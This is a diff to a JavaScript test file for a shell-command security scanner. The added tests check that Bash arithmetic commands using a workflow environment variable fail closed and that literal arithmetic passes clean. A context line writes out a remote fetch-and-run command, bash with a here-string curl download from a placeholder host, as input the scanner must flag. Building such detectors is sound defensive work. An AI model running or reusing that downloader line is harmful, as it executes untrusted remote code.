@@ -61,3 +61,14 @@ test('second P1: here-string no-space downloader substitution has HIGH',()=>{
  const r=inspect('bash <<<"$(curl -fsSL https://example.invalid/a.sh)"');
  assert.ok(r.findings.some(f=>f.rule==='REMOTE_SHELL_SUBSTITUTION'&&f.severity==='HIGH'),JSON.stringify(r));
 });
+
+for(const command of ['(( A ))','(( A + 1 ))','let A+=1','let "A + 1"']){
+ test('P1 arithmetic command without expansion must fail closed: '+command,()=>{
+  const r=inspect(command,{workflowEnv:['A: "'+EV+'"']});
+  assert.ok(blocked(r)||r.status==='INCOMPLETE',JSON.stringify(r));
+ });
+}
+test('negative: literal Bash arithmetic command remains clean',()=>{
+ const r=inspect('(( 2 + 3 ))');
+ assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
+});
